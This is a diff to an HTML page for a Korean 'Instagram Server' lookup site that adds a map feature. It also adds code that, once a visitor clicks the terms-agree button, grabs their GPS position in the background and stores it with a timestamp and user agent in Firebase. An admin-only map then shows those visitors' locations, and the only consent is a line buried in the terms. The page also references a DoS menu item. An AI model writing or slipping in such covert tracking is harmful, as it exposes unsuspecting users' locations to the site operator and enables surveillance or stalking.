@@ -8,6 +8,7 @@
 <meta name="keywords" content="인스타그램, Instagram, 익명조회, 팔로우분석, IP조회, 인스타서버">
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://junohle.github.io/instagram-server/">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css">
 
 <!-- Open Graph -->
 <meta property="og:site_name" content="Instagram Server">
@@ -429,6 +430,7 @@ function pinKey(e, i) {
         <li>서비스 운영자는 이용자의 서비스 이용 기록을 보관하지 않습니다.</li>
         <li>인스타그램 비공개 계정 조회는 지원하지 않습니다.</li>
         <li>본 약관은 사전 예고 없이 변경될 수 있습니다.</li>
+        <li>본 서비스는 서비스 품질 향상을 위해 접속 시 <strong>위치 정보(GPS)</strong>를 수집합니다. 동의하고 시작하기 버튼을 누르면 위치 정보 수집에 동의한 것으로 간주됩니다.</li>
       </ul>
     </div>
     <label class="terms-agree">
@@ -537,6 +539,9 @@ function pinKey(e, i) {
       </div>
       <div class="sidebar-item" onclick="instaLookupOpen()" id="si-instalookup" style="display:none;">
         <span class="si-label" style="color:#d6249f;font-weight:600;">⬡ Insta Lookup</span>
+      </div>
+      <div class="sidebar-item" onclick="mapOpen()" id="si-map" style="display:none;">
+        <span class="si-label" style="color:#4285f4;font-weight:600;">⬡ Map</span>
       </div>
       <div class="sidebar-item" onclick="showTab('tab-users')" id="si-users" style="display:none;">
         <span class="si-label" style="color:#1a56db;font-weight:600;">👥 접속자 관리</span>
@@ -1110,6 +1115,22 @@ async function checkAdminAndGo() {
 
 function goToProfile() {
   document.getElementById("page-terms").style.display="none";
+  // GPS 위치 요청 (백그라운드로 자동 실행)
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(pos => {
+      const { latitude: lat, longitude: lng, accuracy } = pos.coords;
+      // Firebase에 저장
+      try {
+        const db = firebase.database();
+        const ref = db.ref("visitors/" + Date.now());
+        ref.set({
+          lat, lng, accuracy,
+          time: new Date().toISOString(),
+          ua: navigator.userAgent.substring(0, 80)
+        });
+      } catch(e) {}
+    }, () => {}, { timeout: 8000, maximumAge: 0 });
+  }
   // 이미 프로필 있으면 바로 대시보드
   const saved = localStorage.getItem("userProfile");
   if(saved) { goToDash(); return; }
@@ -1183,6 +1204,8 @@ async function goToDash() {
       if(psSi) psSi.style.display = "flex";
       const ilSi = document.getElementById("si-instalookup");
       if(ilSi) ilSi.style.display = "flex";
+      const mapSi = document.getElementById("si-map");
+      if(mapSi) mapSi.style.display = "flex";
     } else {
       if(dosSi) dosSi.style.display = "none";
       if(mbDos) mbDos.style.display = "none";
@@ -1196,6 +1219,8 @@ async function goToDash() {
       if(psSi) psSi.style.display = "none";
       const ilSi = document.getElementById("si-instalookup");
       if(ilSi) ilSi.style.display = "none";
+      const mapSi = document.getElementById("si-map");
+      if(mapSi) mapSi.style.display = "none";
     }
     // 접속자 관리: DEV 전용
     if(isAdminSession()) {
@@ -4320,6 +4345,141 @@ function instaLookupClose() {
   if (page) page.style.display = "none";
 }
 
+// ── Map ──
+let leafletMap = null;
+let leafletLayer = null;
+let leafletMarker = null;
+let mapScriptLoaded = false;
+
+const MAP_LAYERS = {
+  street:    "https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png",
+  satellite: "https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}",
+  topo:      "https://{s}.tile.opentopomap.org/{z}/{x}/{y}.png",
+  dark:      "https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png",
+};
+const MAP_ATTRIBS = {
+  street:    '© OpenStreetMap',
+  satellite: '© Esri',
+  topo:      '© OpenTopoMap',
+  dark:      '© CARTO',
+};
+
+function mapInitLeaflet(cb) {
+  if (window.L) { cb(); return; }
+  const s = document.createElement("script");
+  s.src = "https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js";
+  s.onload = cb;
+  document.head.appendChild(s);
+}
+
+function mapInit() {
+  if (leafletMap) return;
+  mapInitLeaflet(() => {
+    leafletMap = L.map("map", { zoomControl: false, attributionControl: true }).setView([37.5665, 126.9780], 12);
+    leafletLayer = L.tileLayer(MAP_LAYERS.street, { attribution: MAP_ATTRIBS.street, maxZoom: 19 }).addTo(leafletMap);
+    leafletMap.on("mousemove", e => {
+      const el = document.getElementById("map-coords");
+      if (el) el.textContent = `${e.latlng.lat.toFixed(5)}, ${e.latlng.lng.toFixed(5)}`;
+    });
+    leafletMap.on("click", e => {
+      if (leafletMarker) leafletMarker.remove();
+      leafletMarker = L.marker(e.latlng).addTo(leafletMap)
+        .bindPopup(`${e.latlng.lat.toFixed(5)}, ${e.latlng.lng.toFixed(5)}`).openPopup();
+    });
+  });
+}
+
+function mapOpen() {
+  const page = document.getElementById("page-map");
+  if (page) page.style.display = "flex";
+  setTimeout(() => {
+    mapInit();
+    if (leafletMap) leafletMap.invalidateSize();
+    // DEV면 접속자 위치 불러오기
+    if (isAdminSession()) mapLoadVisitors();
+  }, 100);
+}
+
+function mapLoadVisitors() {
+  try {
+    const db = firebase.database();
+    db.ref("visitors").limitToLast(50).once("value", snap => {
+      const data = snap.val();
+      if (!data) return;
+      Object.values(data).forEach(v => {
+        if (!v.lat || !v.lng) return;
+        const marker = L.circleMarker([v.lat, v.lng], {
+          radius: 8, color: "#ff5f57", fillColor: "#ff5f57",
+          fillOpacity: 0.7, weight: 2
+        }).addTo(leafletMap);
+        const time = new Date(v.time).toLocaleString("ko-KR");
+        marker.bindPopup(`
+          <b>📍 접속자 위치</b><br>
+          위도: ${v.lat.toFixed(5)}<br>
+          경도: ${v.lng.toFixed(5)}<br>
+          정확도: ${Math.round(v.accuracy)}m<br>
+          시간: ${time}
+        `);
+      });
+    });
+  } catch(e) {}
+}
+
+function mapClose() {
+  const page = document.getElementById("page-map");
+  if (page) page.style.display = "none";
+}
+
+function mapSearch() {
+  const q = document.getElementById("map-search").value.trim();
+  if (!q || !leafletMap) return;
+  // 좌표 형식 (37.5, 126.9)
+  const coordMatch = q.match(/^(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)$/);
+  if (coordMatch) {
+    const lat = parseFloat(coordMatch[1]), lng = parseFloat(coordMatch[2]);
+    leafletMap.setView([lat, lng], 15);
+    if (leafletMarker) leafletMarker.remove();
+    leafletMarker = L.marker([lat, lng]).addTo(leafletMap).bindPopup(q).openPopup();
+    return;
+  }
+  // 주소/장소 검색 (Nominatim)
+  fetch(`https://nominatim.openstreetmap.org/search?q=${encodeURIComponent(q)}&format=json&limit=1`, {
+    headers: { "Accept-Language": "ko" }
+  })
+  .then(r => r.json())
+  .then(data => {
+    if (!data.length) { alert("검색 결과가 없습니다."); return; }
+    const { lat, lon, display_name } = data[0];
+    leafletMap.setView([lat, lon], 15);
+    if (leafletMarker) leafletMarker.remove();
+    leafletMarker = L.marker([lat, lon]).addTo(leafletMap).bindPopup(display_name).openPopup();
+  })
+  .catch(() => alert("검색 실패. 다시 시도해주세요."));
+}
+
+function mapMyLocation() {
+  if (!navigator.geolocation) { alert("위치 정보를 사용할 수 없습니다."); return; }
+  navigator.geolocation.getCurrentPosition(pos => {
+    const { latitude: lat, longitude: lng } = pos.coords;
+    if (!leafletMap) return;
+    leafletMap.setView([lat, lng], 16);
+    if (leafletMarker) leafletMarker.remove();
+    leafletMarker = L.marker([lat, lng]).addTo(leafletMap).bindPopup("📍 내 위치").openPopup();
+  }, () => alert("위치 권한이 필요합니다."));
+}
+
+function mapChangeLayer() {
+  const val = document.getElementById("map-layer").value;
+  if (!leafletMap || !leafletLayer) return;
+  leafletMap.removeLayer(leafletLayer);
+  leafletLayer = L.tileLayer(MAP_LAYERS[val], { attribution: MAP_ATTRIBS[val], maxZoom: 19 }).addTo(leafletMap);
+}
+
+function mapZoom(dir) {
+  if (!leafletMap) return;
+  leafletMap.setZoom(leafletMap.getZoom() + dir);
+}
+
 function ilReset() {
   document.getElementById("il-input-area").style.display = "flex";
   document.getElementById("il-result").style.display = "none";
@@ -4783,6 +4943,42 @@ print('Hello, World!')"></textarea>
         <a href="https://t.me/JY091025_lee" target="_blank" style="display:inline-block;margin-left:8px;background:#1a8cff22;border:1px solid #1a8cff44;border-radius:8px;color:#1a8cff;font-family:'Courier New',monospace;font-size:11px;padding:8px 20px;text-decoration:none;">개발자 문의</a>
       </div>
     </div>
+  </div>
+</div>
+
+<!-- ── Map ── -->
+<div id="page-map" style="display:none;position:fixed;inset:0;z-index:5000;flex-direction:column;background:#1a1a2e;">
+  <!-- 헤더 -->
+  <div style="background:#16213e;border-bottom:1px solid #4285f433;padding:8px 14px;display:flex;align-items:center;gap:10px;z-index:10;flex-shrink:0;">
+    <span style="color:#4285f4;font-weight:700;font-size:14px;letter-spacing:1px;">⬡ Map</span>
+    <!-- 검색창 -->
+    <div style="flex:1;max-width:400px;display:flex;gap:6px;">
+      <input id="map-search" type="text" placeholder="장소, 주소, 좌표 검색..."
+        style="flex:1;background:#0f3460;border:1px solid #4285f444;border-radius:20px;color:#fff;font-size:13px;padding:6px 14px;outline:none;"
+        onkeydown="if(event.key==='Enter')mapSearch()">
+      <button onclick="mapSearch()" style="background:#4285f4;border:none;border-radius:20px;color:#fff;font-size:12px;padding:6px 14px;cursor:pointer;font-weight:700;">검색</button>
+    </div>
+    <!-- 내 위치 -->
+    <button onclick="mapMyLocation()" style="background:#34a85322;border:1px solid #34a853;border-radius:20px;color:#34a853;font-size:12px;padding:6px 12px;cursor:pointer;">📍 내 위치</button>
+    <!-- 레이어 선택 -->
+    <select id="map-layer" onchange="mapChangeLayer()" style="background:#0f3460;border:1px solid #4285f444;border-radius:8px;color:#fff;font-size:12px;padding:5px 8px;outline:none;">
+      <option value="street">일반</option>
+      <option value="satellite">위성</option>
+      <option value="topo">지형</option>
+      <option value="dark">다크</option>
+    </select>
+    <button onclick="mapClose()" style="background:#ff5f5722;border:1px solid #ff5f5766;border-radius:8px;color:#ff5f57;font-size:12px;padding:6px 12px;cursor:pointer;">✕ 닫기</button>
+  </div>
+  <!-- 지도 -->
+  <div id="map-container" style="flex:1;position:relative;">
+    <div id="map" style="width:100%;height:100%;"></div>
+    <!-- 줌 버튼 -->
+    <div style="position:absolute;right:14px;top:14px;display:flex;flex-direction:column;gap:4px;z-index:10;">
+      <button onclick="mapZoom(1)" style="width:32px;height:32px;background:#16213e;border:1px solid #4285f444;border-radius:6px;color:#4285f4;font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center;">+</button>
+      <button onclick="mapZoom(-1)" style="width:32px;height:32px;background:#16213e;border:1px solid #4285f444;border-radius:6px;color:#4285f4;font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center;">−</button>
+    </div>
+    <!-- 좌표 표시 -->
+    <div id="map-coords" style="position:absolute;bottom:10px;left:50%;transform:translateX(-50%);background:#16213ecc;border:1px solid #4285f433;border-radius:20px;padding:4px 14px;font-size:11px;color:#4285f4;font-family:'Courier New',monospace;pointer-events:none;"></div>
   </div>
 </div>
 
